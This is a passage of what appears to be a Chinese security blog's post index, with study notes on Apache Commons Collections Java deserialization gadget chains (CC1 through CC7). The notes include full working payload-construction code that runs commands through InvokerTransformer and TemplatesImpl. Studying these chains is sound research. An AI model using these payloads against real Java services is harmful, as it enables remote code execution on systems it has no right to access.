/>\n\n在RenewCleanThread中调用了makeDirtyCall函数，makeDirtyCall函数中调用了dirty函数，由此来触发一个客户端请求，从而导致反序列化攻击\n\n","tags":["java"],"categories":["RMI"]},{"title":"CommonsCollections","url":"/post/4ffaad45.html","content":"\nCC2+CC4+CC5+CC7\n\n<!--more-->\n\n##### CC2\n\n添加版本依赖\n\n```xml\n<dependency>\n    <groupId>org.apache.commons</groupId>\n    <artifactId>commons-collections4</artifactId>\n    <version>4.0</version>\n</dependency>\n```\n\n链的后半部分保持不变\n\n```\nChainedTransformer.transform()\n----->\nInvokerTransformer.transform()\n----->\nTemplatesImpl.newTransformer() \n----->\nTemplatesImpl.getTransletInstance() \n----->\nTemplatesImpl.defineTransletClasses()(_class[i] = loader.defineClass(_bytecodes[i]);)\n_class[_transletIndex].newInstance()\n```\n\n因此主要是找执行`newTransformer`的方法，而`commons-collections4`中存在类`TransformingComparator`（支持可序列化），该类的`compare`方法调用了`Transformer`的`transform`方法\n\n> `transformer` 对象负责将输入的对象转换为某种中间形式。比如，如果你有一组复杂的对象，而你只关心其中的某个字段，你可以用 `transformer` 提取这个字段。\n>\n> `decorated` 对象负责对转换后的中间形式进行比较。它通常是一个比较器（Comparator），定义了比较的逻辑。\n\n```java\npublic int compare(final I obj1, final I obj2) {\n    final O value1 = this.transformer.transform(obj1);\n    final O value2 = this.transformer.transform(obj2);\n    return this.decorated.compare(value1, value2);\n}\n```\n\n因此只需要构造的时候传递`this.transformer`为`ChainedTransformer`对象\n\n接着就是找反序列化时调用`compare`函数的对象，此处选择的是`PriorityQueue`对象（可序列化），该类的`readObject`对象调用了`heapify`方法，`heapify`方法中调用了`siftDown`方法，`siftDown`方法调用了`siftDownUsingComparator`方法，`siftDownUsingComparator`方法中调用了`compare`方法，并且此处的`comparator`可控\n\n```java\nprivate void siftDownUsingComparator(int k, E x) {\n    int half = size >>> 1;\n    while (k < half) {\n        int child = (k << 1) + 1;\n        Object c = queue[child];\n        int right = child + 1;\n        if (right < size &&\n            comparator.compare((E) c, (E) queue[right]) > 0)\n            c = queue[child = right];\n        if (comparator.compare(x, (E) c) <= 0)\n            break;\n        queue[k] = c;\n        k = child;\n    }\n    queue[k] = x;\n}\n```\n\n###### 构造代码\n\n```java\n        TemplatesImpl templates = new TemplatesImpl();\n        byte[] code= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Hello.class\"));\n        byte[] code2= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Test.class\"));\n        Class<TemplatesImpl> clazz = TemplatesImpl.class;\n        Field field = clazz.getDeclaredField(\"_bytecodes\");\n        field.setAccessible(true);\n        // bytecodes的长度设置为2\n        field.set(templates, new byte[][]{code, code2});\n        field= clazz.getDeclaredField(\"_name\");\n        field.setAccessible(true);\n        field.set(templates, \"123\");\n        field= clazz.getDeclaredField(\"_tfactory\");\n        field.setAccessible(true);\n        field.set(templates, new TransformerFactoryImpl());\n        field= clazz.getDeclaredField(\"_transletIndex\");\n        field.setAccessible(true);\n        field.set(templates, 0);\n        Transformer[] transforms = new Transformer[]{\n                new ConstantTransformer(templates),\n                new InvokerTransformer(\"newTransformer\", new Class[]{}, new Object[]{}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);\n        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer,new ComparableComparator<>());\n        PriorityQueue priorityQueue = new PriorityQueue<>(2,transformingComparator);\n        Class clazzPriorityQueue = PriorityQueue.class;\n        Field fieldsize = clazzPriorityQueue.getDeclaredField(\"size\");\n        fieldsize.setAccessible(true);\n        fieldsize.set(priorityQueue,2);\n        serialize(priorityQueue);\n        unserialize(\"data.bin\");\n```\n\n##### CC4\n\n将上面执行代码的方式(`InvokerTransformer`)改成`InstantiateTransformer`类的`transform`方法\n\n```java\n        TemplatesImpl templates = new TemplatesImpl();\n        byte[] code= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Hello.class\"));\n        byte[] code2= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Test.class\"));\n        Class<TemplatesImpl> clazz = TemplatesImpl.class;\n        Field field = clazz.getDeclaredField(\"_bytecodes\");\n        field.setAccessible(true);\n        // bytecodes的长度设置为2\n        field.set(templates, new byte[][]{code, code2});\n        field= clazz.getDeclaredField(\"_name\");\n        field.setAccessible(true);\n        field.set(templates, \"123\");\n        field= clazz.getDeclaredField(\"_tfactory\");\n        field.setAccessible(true);\n        field.set(templates, new TransformerFactoryImpl());\n        field= clazz.getDeclaredField(\"_transletIndex\");\n        field.setAccessible(true);\n        field.set(templates, 0);\n//        templates.newTransformer();\n        Transformer[] transforms = new Transformer[]{\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);\n        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer,new ComparableComparator<>());\n        PriorityQueue priorityQueue = new PriorityQueue<>(2,transformingComparator);\n        Class clazzPriorityQueue = PriorityQueue.class;\n        Field fieldsize = clazzPriorityQueue.getDeclaredField(\"size\");\n        fieldsize.setAccessible(true);\n        fieldsize.set(priorityQueue,2);\n        serialize(priorityQueue);\n        unserialize(\"data.bin\");\n```\n\n##### CC5\n\n链子后半部分不变，仍然是找执行`LazyMap`的`get`方法的类，在`collections4`中，`TiedMapEntry`的`getValue`方法调用了其`get`方法，同时其`toString`方法调用了`getValue`方法，由此形成闭环\n\n```java\n/**\n * Gets a string version of the entry.\n *\n * @return entry as a string\n */\n@Override\npublic String toString() {\n    return getKey() + \"=\" + getValue();\n}\n```\n\n因此主要寻找某类，该类的`readObject`方法调用`toString`，并且可控制，此处选择的是`BadAttributeValueExpException`类，该类的`readObject`方法中的第三个条件片段中执行了`toString`方法\n\n> 如果 `valObj` 是 `null`，则将 `val` 设为 `null`。\n>\n> 如果 `valObj` 是 `String` 类型，直接将 `valObj` 赋值给 `val`。\n>\n> - 如果系统没有安全管理器（即 System.getSecurityManager() == null），或者 valObj 是以下类型之一：`Long`、`Integer`、`Float`、`Double`、`Byte`、`Short`、`Boolean`\n>\n> 则将 `valObj` 转换为字符串并赋值给 `val`。\n\n<img src=\"CommonsCollections/image-20240613110449942.png\" alt=\"image-20240613110449942\" style=\"zoom:33%;\" />\n\n\n\n由此构造代码如下\n\n```java\n        TemplatesImpl templates = new TemplatesImpl();\n        byte[] code= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Hello.class\"));\n        byte[] code2= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Test.class\"));\n        Class<TemplatesImpl> clazz = TemplatesImpl.class;\n        Field field = clazz.getDeclaredField(\"_bytecodes\");\n        field.setAccessible(true);\n        // bytecodes的长度设置为2\n        field.set(templates, new byte[][]{code, code2});\n        field= clazz.getDeclaredField(\"_name\");\n        field.setAccessible(true);\n        field.set(templates, \"123\");\n        field= clazz.getDeclaredField(\"_tfactory\");\n        field.setAccessible(true);\n        field.set(templates, new TransformerFactoryImpl());\n        field= clazz.getDeclaredField(\"_transletIndex\");\n        field.setAccessible(true);\n        field.set(templates, 0);\n//        templates.newTransformer();\n        Transformer[] transforms = new Transformer[]{\n                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);\n        Map map = new HashMap();\n        LazyMap lazyMap = LazyMap.lazyMap(map,chainedTransformer);\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,TrAXFilter.class);\n        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n        Class clazz1 = BadAttributeValueExpException.class;\n        Field val = clazz1.getDeclaredField(\"val\");\n        val.setAccessible(true);\n        val.set(badAttributeValueExpException,tiedMapEntry);\n        serialize(badAttributeValueExpException);\n        unserialize(\"data.bin\");\n```\n\n此处的`LazyMap`可以用`DefaultedMap`所替代\n\n```java\n        TemplatesImpl templates = new TemplatesImpl();\n        byte[] code= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Hello.class\"));\n        byte[] code2= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Test.class\"));\n        Class<TemplatesImpl> clazz = TemplatesImpl.class;\n        Field field = clazz.getDeclaredField(\"_bytecodes\");\n        field.setAccessible(true);\n        // bytecodes的长度设置为2\n        field.set(templates, new byte[][]{code, code2});\n        field= clazz.getDeclaredField(\"_name\");\n        field.setAccessible(true);\n        field.set(templates, \"123\");\n        field= clazz.getDeclaredField(\"_tfactory\");\n        field.setAccessible(true);\n        field.set(templates, new TransformerFactoryImpl());\n        field= clazz.getDeclaredField(\"_transletIndex\");\n        field.setAccessible(true);\n        field.set(templates, 0);\n//        templates.newTransformer();\n        Transformer[] transforms = new Transformer[]{\n                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);\n        Map map = new HashMap();\n        DefaultedMap defaultedMap = (DefaultedMap) DefaultedMap.decorate(map, chainedTransformer);\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap, TrAXFilter.class);\n        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n        Field val = BadAttributeValueExpException.class.getDeclaredField(\"val\");\n        val.setAccessible(true);\n        val.set(badAttributeValueExpException, tiedMapEntry);\n        serialize(badAttributeValueExpException);\n        unserialize(\"data.bin\");\n```\n\n##### CC7\n\n这条链是用`AbstractMap`抽象类的`equals`函数执行`DefaultedMap`类的`get`方法\n\n<img src=\"CommonsCollections/image-20240613163939854.png\" alt=\"image-20240613163939854\" style=\"zoom:33%;\" />\n\n由于`AbstractMap`是抽象类，因此不能直接实例化，要寻找它的继承子类，并且没有`equals`函数，就会执行`Abstract`的`equals`方法，这里选择的是可序列化的`HashMap`类，因此问题变成了寻找`readObject`函数，该函数应该能执行`equals`方法\n\n这里选择`HashTable`类，该类的`readObject`方法调用了`reconstitutionPut`方法，这里的`elements`是`HashTable`键值对的数量\n\n<img src=\"CommonsCollections/image-20240613164226953.png\" alt=\"image-20240613164226953\" style=\"zoom:50%;\" />\n\n`reconstitutionPut`方法中调用了`equals`函数，并且原理应该是先传进的键调用`equals`方法，以后传进的键作为参数\n\n```java\nprivate void reconstitutionPut(Entry<?,?>[] tab, K key, V value)\n    throws StreamCorruptedException\n{\n    if (value == null) {\n        throw new java.io.StreamCorruptedException();\n    }\n    // Makes sure the key is not already in the hashtable.\n    // This should not happen in deserialized version.\n    int hash = key.hashCode();\n    int index = (hash & 0x7FFFFFFF) % tab.length;\n    for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {\n        if ((e.hash == hash) && e.key.equals(key)) {\n            throw new java.io.StreamCorruptedException();\n        }\n    }\n    // Creates the new entry.\n    @SuppressWarnings(\"unchecked\")\n        Entry<K,V> e = (Entry<K,V>)tab[index];\n    tab[index] = new Entry<>(hash, key, value, e);\n    count++;\n}\n```\n\n因此先传进的应是`HashMap`对象，后传进的是`DefaultedMap`对象，相当于调用`AbstractMap`的`equals`方法，以构造的`DefaultedMap`对象作为参数\n\n```java\nTransformer[] transforms = new Transformer[]{\n        new ConstantTransformer(Runtime.class),\n        new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}),\n        new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),\n        new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"})\n};\nChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});\nHashMap<Object,Object> map = new HashMap<>();\nDefaultedMap defaultedMap = (DefaultedMap) DefaultedMap.decorate(new HashMap<>(), chainedTransformer);\nmap.put(\"key1\", \"value1\");\ndefaultedMap.put(\"key2\", \"value2\");\nHashtable<Object, Object> objectObjectHashtable = new Hashtable<>();\nobjectObjectHashtable.put(map, 1);\nobjectObjectHashtable.put(defaultedMap, 2);\nClass clazz3 = chainedTransformer.getClass();\nField field1 = clazz3.getDeclaredField(\"iTransformers\");\nfield1.setAccessible(true);\nfield1.set(chainedTransformer, transforms);\nserialize(objectObjectHashtable);\n```\n","tags":["java"],"categories":["安全"]},{"title":"CommonsCollections3","url":"/post/6b2bc129.html","content":"\n##### 特点\n\n更换命令执行方式，之前是 `Runtime.getRuntime().exec(\"calc\");` ，但很多时候可能存在Runtime过滤的情况，因此将执行命令方式更换为类动态加载执行命令\n\n<!--more-->\n\n##### 找链子\n\n在\t中提到动态加载过程：`loadClass->findClass（重写的方法）->defineClass(从字节码加载)`\n\n因此我们可以使用`defineClass`加载我们生成好的执行命令对象，`defineClass`只能是加载，加载后的`class`对象还需要进行`newinstance`实例化才能执行代码块\n\n此处选择的是`TemplatesImpl`类，查看该类的`defineClass`方法，可以看到是`Class`类\n\n> **`public`**：希望方法对所有类都可见且可访问时，例如公共 API 的方法。\n>\n> **`private`**：希望方法只在类内部使用时，例如辅助性方法，不希望暴露给其他类使用。\n>\n> **`protected`**：希望方法可以在同一个包内以及在子类中使用时，例如需要扩展和重写的方法。\n>\n> **默认（包私有）**：希望方法只在同一个包内使用，不希望暴露给其他包或子类时。\n\n```java\n/**\n * Access to final protected superclass member from outer class.\n */\nClass defineClass(final byte[] b) {\n    return defineClass(null, b, 0, b.length);\n}\n```\n\n此处的`b`应该传入构造的用于执行代码的对象的字节\n\n首先创建该字节，构造一段执行代码的代码，然后编译，在`out`文件夹中找到对应的`class`文件，此处我生成的的是Hello.class文件，读取文件字节代码如下\n\n```java\nbyte[] code= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Hello.class\"));\n\n\\\\ Hello.java:\nimport java.io.IOException;\n\npublic class Hello {\n    static {\n        try {\n            Runtime.getRuntime().exec(\"calc\");\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}\n```\n\n因此应该想办法将这个`code`传入到上面的`defineClass`，同时再想办法执行`newinstance`进行实例化才能执行静态代码块，而上面的`defineClass`是不允许外部调用的，查看其调用过程\n\n在`TemplatesImpl`类的`defineTransletClasses`方法中实现了唯一的调用，此处有几个地方需要注意，首先是`_bytecodes`变量不能为`null`，并且可以看到传入的对象是`_bytecodes[i]`，因此`_bytecodes`实际上应该是一个二维数组，还有就是`_tfactory`也不能为空，否则无法执行到下面的语句\n\n<img src=\"CommonsCollections3/image-20240612100218227.png\" alt=\"image-20240612100218227\" style=\"zoom: 33%;\" />\n\n下面还有一个值得注意的地方，此处的_auxClasses只有在`classCount`大于`1`的时候才执行，而下面`if`语句中只有获取到加载的我们的类的父类和`ABSTRACT_TRANSLET`相等才不能进入`else`语句，因此此处可以使`classCount`数量大于`1`\n\n<img src=\"CommonsCollections3/image-20240612100510215.png\" alt=\"image-20240612100510215\" style=\"zoom:33%;\" />\n\n最后假设我们能够顺利加载类，还应该对加载的类进行实例化才能执行我们的静态代码块，因此继续找调用`defineTransletClasses`方法并且进行实例化的函数，此处找到的是`getTransletInstance`方法，如下所示，该方法在调用`defineTransletClasses`之后对加载的类`_class`进行了实例化\n\n<img src=\"CommonsCollections3/image-20240612100945462.png\" alt=\"image-20240612100945462\" style=\"zoom:33%;\" />\n\n##### 代码构造\n\n首先新建`TemplatesImpl`类\n\n```java\nTemplatesImpl templates = new TemplatesImpl();\n```\n\n然后确定`_name`变量不能为空，`_class`变量不能为空，`_transletIndex`变量不能为-1，`_tfactory`变量不能为空，`_bytecodes`长度应该为2\n\n```java\nClass clazz = TemplatesImpl.class;\nField field = clazz.getDeclaredField(\"_name\");\nfield.setAccessible(true);\nfield.set(templates, \"123\");\nbyte[] code= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Hello.class\"));\nbyte[] code2= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Test.class\"));\nfield = clazz.getDeclaredField(\"_bytecodes\");\nfield.setAccessible(true);\n// bytecodes的长度设置为2\nfield.set(templates, new byte[][]{code, code2});\nfield= clazz.getDeclaredField(\"_tfactory\");\nfield.setAccessible(true);\nfield.set(templates, new TransformerFactoryImpl());\nfield= clazz.getDeclaredField(\"_transletIndex\");\nfield.setAccessible(true);\nfield.set(templates, 0);\n```\n\n由于`getTransletInstance`是`private`，因此找到调用该方法的`public`方法`newTransformer`\n\n<img src=\"CommonsCollections3/image-20240612101351398.png\" alt=\"image-20240612101351398\" style=\"zoom:50%;\" />\n\n调用构造的`TemplatesImpl`对象的`newTransformer`方法就可以执行我们的代码\n\n<img src=\"CommonsCollections3/image-20240612101455864.png\" alt=\"image-20240612101455864\" style=\"zoom: 25%;\" />\n\n为了实现反序列化执行代码，可以直接使用前两篇中的`InvokerTransformer`的`transformer`漏洞\n\n```java\n        TemplatesImpl templates = new TemplatesImpl();\n        Class clazz = TemplatesImpl.class;\n        Field field = clazz.getDeclaredField(\"_name\");\n        field.setAccessible(true);\n        field.set(templates, \"123\");\n        byte[] code= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Hello.class\"));\n        byte[] code2= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Test.class\"));\n        field = clazz.getDeclaredField(\"_bytecodes\");\n        field.setAccessible(true);\n        // bytecodes的长度设置为2\n        field.set(templates, new byte[][]{code, code2});\n        field= clazz.getDeclaredField(\"_tfactory\");\n        field.setAccessible(true);\n        field.set(templates, new TransformerFactoryImpl());\n        field= clazz.getDeclaredField(\"_transletIndex\");\n        field.setAccessible(true);\n        field.set(templates, 0);\n//        templates.newTransformer();\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(templates),\n                new InvokerTransformer(\"newTransformer\", new Class[]{}, new Object[]{}),\n        };\n        ChainedTransformer transformerChain = new ChainedTransformer(transformers);\n        HashMap<Object,Object> map = new HashMap<>();\n        Map tmplazymap= LazyMap.decorate(map,transformerChain);\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(map,\"1\");\n        HashMap hashMap = new HashMap<>();\n        hashMap.put(tiedMapEntry,\"2\");\n        Class tiedMapEntryClass = TiedMapEntry.class;\n        Field tiedMapEntryClassDeclaredField = tiedMapEntryClass.getDeclaredField(\"map\");\n        tiedMapEntryClassDeclaredField.setAccessible(true);\n        tiedMapEntryClassDeclaredField.set(tiedMapEntry,tmplazymap);\n        serialize(hashMap);\n        unserialize(\"data.bin\");\n```\n\n除了使用`InvokerTransformer`的`transform`方法漏洞，此处还能调用`InstantiateTransformer`方法，原理是实现调用构造的`TemplatesImpl`对象的`newTransformer`方法\n\n```java\n/**\n * Constructor that performs no validation.\n * Use <code>getInstance</code> if you want that.\n * \n * @param paramTypes  一个 Class[] 数组，表示构造函数参数的类型。这些类型不被克隆（即不创建参数类型的副本，而是直接引用传递进来的数组）。\n * @param args  一个 Object[] 数组，表示构造函数的实际参数。这些参数也不被克隆（即不创建参数的副本，而是直接引用传递进来的数组）。\n */\npublic InstantiateTransformer(Class[] paramTypes, Object[] args) {\n    super();\n    iParamTypes = paramTypes;\n    iArgs = args;\n}\n```\n\n该方法的`transform`方法实现了构造`input`的构造函数，并以输入的`Class`数组作为传输传递\n\n<img src=\"CommonsCollections3/image-20240612102359835.png\" alt=\"image-20240612102359835\" style=\"zoom: 33%;\" />\n\n这里使用的是`TrAXFilter`类，就相当于`TrAXFilter`将要接受`iParamTypes`类型的`class`的参数进行实例化，因为`TrAXFilter`的初始化函数中实现了调用输入参数的`newTransformer`方法\n\n```java\npublic TrAXFilter(Templates templates)  throws\n    TransformerConfigurationException\n{\n    _templates = templates;\n    _transformer = (TransformerImpl) templates.newTransformer();\n    _transformerHandler = new TransformerHandlerImpl(_transformer);\n    _useServicesMechanism = _transformer.useServicesMechnism();\n}\n```\n\n因此上面的`iParamTypes`应该是`templates`的`class`类型，`iArgs`就是`templates`\n\n`InstantiateTransformer`类的构造方法如下\n\n```java\nInstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});\ninstantiateTransformer.transform(TrAXFilter.class);\n```\n\n最后将`InstantiateTransformer`类放入`transformerChain`中\n\n```java\n        TemplatesImpl templates = new TemplatesImpl();\n        Class clazz = TemplatesImpl.class;\n        Field field = clazz.getDeclaredField(\"_name\");\n        field.setAccessible(true);\n        field.set(templates, \"123\");\n        byte[] code= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Hello.class\"));\n        byte[] code2= Files.readAllBytes(Paths.get(\"D:\\\\java workforse\\\\java_deserialization\\\\Test.class\"));\n        field = clazz.getDeclaredField(\"_bytecodes\");\n        field.setAccessible(true);\n        // bytecodes的长度设置为2\n        field.set(templates, new byte[][]{code, code2});\n        field= clazz.getDeclaredField(\"_tfactory\");\n        field.setAccessible(true);\n        field.set(templates, new TransformerFactoryImpl());\n        field= clazz.getDeclaredField(\"_transletIndex\");\n        field.setAccessible(true);\n        field.set(templates, 0);\n//        templates.newTransformer();\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),\n        };\n        ChainedTransformer transformerChain = new ChainedTransformer(transformers);\n        HashMap<Object,Object> map = new HashMap<>();\n        Map tmplazymap= LazyMap.decorate(map,transformerChain);\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(map,\"1\");\n        HashMap hashMap = new HashMap<>();\n        hashMap.put(tiedMapEntry,\"2\");\n        Class tiedMapEntryClass = TiedMapEntry.class;\n        Field tiedMapEntryClassDeclaredField = tiedMapEntryClass.getDeclaredField(\"map\");\n        tiedMapEntryClassDeclaredField.setAccessible(true);\n        tiedMapEntryClassDeclaredField.set(tiedMapEntry,tmplazymap);\n        serialize(hashMap);\n        unserialize(\"data.bin\");\n```\n","tags":["java"],"categories":["安全"]},{"title":"CommonsCollections6","url":"/post/1b4135a6.html","content":"\n##### 前景提要\n\n前面两种链子都依赖于`jdk`版本，在更新后的`jdk`版本中`AnnotationInvocationHandler`类已有更新，难以利用\n\n除了利用`AnnotationInvocationHandler`类的`readObject`方法以外，还可以利用`HashMap`类的`readObject`方法\n\n<!--more-->\n\n##### 找链子\n\n首先还是确定好链子终点，还是`InvokerTransformer`类的`transform`方法，能够实现执行任意对象的任意方法，因此还是构造`ChainedTransformer`对象，调用该对象的`transform`方法可直接实现执行`calc`命令\n\n```java\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n                new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"})\n        };\n        ChainedTransformer transformerChain = new ChainedTransformer(transformers);\n```\n\n还是使用`LazyMap`类构造实例，该类的`get`方法实现了`Transformer`类的`transform`方法的调用\n\n```java\nHashMap<Object,Object> map = new HashMap<>();\nMap tmplazymap= LazyMap.decorate(map,transformerChain);\n```\n\n前面提到该次链子的起点是`HashMap`的`readObject`方法，而`HashMap`的`readObject`方法调用了其`key`值的`hashcode`方法，因此下一个点应该是包含`map`的`get`方法的`hashcode`方法，此处选择的是`TiedMapEntry`，在`TiedMapEntry`中的`hashcode`方法，调用了`getValue`方法，而`getValue`方法中就调用了`map`的`get`方法，此处的`map`是可控制的\n\n```java\npublic class TiedMapEntry implements Map.Entry, KeyValue, Serializable {\n    /**\n     * Constructs a new entry with the given Map and key.\n     *\n     * @param map  the map\n     * @param key  the key\n     */\n    public TiedMapEntry(Map map, Object key) {\n        super();\n        this.map = map;\n        this.key = key;\n    }\n\n    /**\n     * Gets the value of this entry direct from the map.\n     * \n     * @return the value\n     */\n    public Object getValue() {\n        return map.get(key);\n    }\n\n\n    /**\n     * Gets a hashCode compatible with the equals method.\n     * <p>\n     * Implemented per API documentation of {@link java.util.Map.Entry#hashCode()}\n     * \n     * @return a suitable hash code\n     */\n    public int hashCode() {\n        Object value = getValue();\n        return (getKey() == null ? 0 : getKey().hashCode()) ^\n               (value == null ? 0 : value.hashCode()); \n    }\n\n\n}\n```\n\n此处的map传递的应该是构造的`LazyMap`对象,`key`值不做影响，因为要执行的`transform`方法有了`new ConstantTransformer(Runtime.class)`后本身也不需要传参\n\n```java\nTiedMapEntry tiedMapEntry = new TiedMapEntry(tmplazymap,\"1\");\n```\n\n然后就可以构造`HashMap`类，而`HashMap`类传参是一个`Map`对象，因此`tiedMapEntry`应该是作为一个键或者值传入该类进行实例化，查看其`readObject`方法，可以看到的是对`key`进行`hash`，调用`hashcode`方法，因此此处只想要将`key`指定为`tiedMapEntry`对象即可\n\n<img src=\"CommonsCollections6/image-20240611161336824.png\" alt=\"image-20240611161336824\" style=\"zoom: 50%;\" />\n\n```java\nhashMap.put(tiedMapEntry,\"2\");\n```\n\n但是这样会引发一个问题，此处的`put`函数本身也是会调用`hashcode`方法，因此`put`之前，不能直接将原`tiedMapEntry`作为`key`传入，只能传之后想办法改变`tiedMapEntry`为原`key`\n\n<img src=\"CommonsCollections6/image-20240611161528259.png\" alt=\"image-20240611161528259\" style=\"zoom:50%;\" />\n\n此处选择在构造`TiedMapEntry`对象时，改变传入的`map`对象，在`put`后进行反射修改\n\n```java\nHashMap<Object,Object> map = new HashMap<>();\nMap tmplazymap= LazyMap.decorate(map,transformerChain);\nTiedMapEntry tiedMapEntry = new TiedMapEntry(map,\"1\");\nHashMap hashMap = new HashMap<>();\nhashMap.put(tiedMapEntry,\"2\");\nClass clazz = TiedMapEntry.class;\nField field = clazz.getDeclaredField(\"map\");\nfield.setAccessible(true);\nfield.set(tiedMapEntry,tmplazymap);\n```\n\n##### 代码构造\n\n综上所述，最后的代码为\n\n```java\nTransformer[] transformers = new Transformer[]{\n        new ConstantTransformer(Runtime.class),\n        new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n        new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n        new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"})\n};\nChainedTransformer transformerChain = new ChainedTransformer(transformers);\nHashMap<Object,Object> map = new HashMap<>();\nMap tmplazymap= LazyMap.decorate(map,transformerChain);\nTiedMapEntry tiedMapEntry = new TiedMapEntry(map,\"1\");\nHashMap hashMap = new HashMap<>();\nhashMap.put(tiedMapEntry,\"2\");\nClass clazz = TiedMapEntry.class;\nField field = clazz.getDeclaredField(\"map\");\nfield.setAccessible(true);\nfield.set(tiedMapEntry,tmplazymap);\nserialize(hashMap);\nunserialize(\"data.bin\");\n```\n","tags":["java"],"categories":["安全"]},{"title":"CommonsCollections1","url":"/post/4ffaad89.html","content":"\n###### 前景提要\n\njdk版本：8u65\t下载链接：[Java 存档下载 — Java SE 8 | Oracle 中国](https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html)\n\ncc版本：3.2.1\t\n\n```xml\n<dependency>\n    <groupId>commons-collections</groupId>\n    <artifactId>commons-collections</artifactId>\n    <version>3.2.1</version>\t\n</dependency>\n```\n\n用https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip下载到的zip文件中的src/share/classes目录下的sun添加到jdk_8u65/目录下的src.jar解压后的src文件中，再将src/目录添加到项目的sdk源路径中，可实现将class文件转换为java（方便调试）\n\n<img src=\"CommonsCollections1/image-20240608170247917.png\" alt=\"image-20240608170247917\" style=\"zoom:50%;\" />\n\n<!--more-->\n\n###### 入口\n\n此处为 `commons-collections` 中 `Transformer` 的实现类 `InvokerTransformer` 中的 `transformer` 方法如果此处的 `this.IMethodName` 和 `this.iParamTypes` 可以自己构造，即可实现执行任意方法调用功能\n\n<img src=\"CommonsCollections1/image-20240608193355690.png\" alt=\"image-20240608193355690\" style=\"zoom: 33%;\" />\n\n\n\n### 利用漏洞\n\n简单回顾一下动态调用方法，首先获取Class对象，再获取方法对象，再传入实例名和参数执行该实例的该方法\n\n<img src=\"CommonsCollections1/image-20240608194347717.png\" alt=\"image-20240608194347717\" style=\"zoom:33%;\" />\n\n##### 终点确认\n\n尝试创建`InvokerTransformer`对象，并调用`transformer`方法\n\n```java\nnew InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}).transform(Runtime.getRuntime());\n//     public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {\n//\t   \t  this.iMethodName = methodName;\n//        this.iParamTypes = paramTypes;\n//        this.iArgs = args;\n//    }\n```\n\n也就是此处我们只要能创建 `InvokerTransformer` 类并执行其 `transformer` 方法就可以实现执行任意方法\n\n因此下一步是找可以构造指定类执行`transformer`方法的函数\n\n##### 进阶1\n\n根据调用函数选择的是`TransformerMap`类的`checkSetValue`方法，此处的 `valueTransformer` 是可构造的\n\n<img src=\"CommonsCollections1/image-20240609150002187.png\" alt=\"image-20240609150002187\" style=\"zoom:33%;\" />\n\n找到 `valueTransformer` 和 `keyTransformer` 对象传参定义的地方，为此处的`TransformedMap`方法\n\n<img src=\"CommonsCollections1/image-20240608202436805.png\" alt=\"image-20240608202436805\" style=\"zoom:33%;\" />\n\n找到调用 `TransformedMap` 方法的地方，这里的`decorate`实现了传参创建类的方法\n\n<img src=\"CommonsCollections1/image-20240608202535299.png\" alt=\"image-20240608202535299\" style=\"zoom:33%;\" />\n\n找到调用 `checkSetValue` 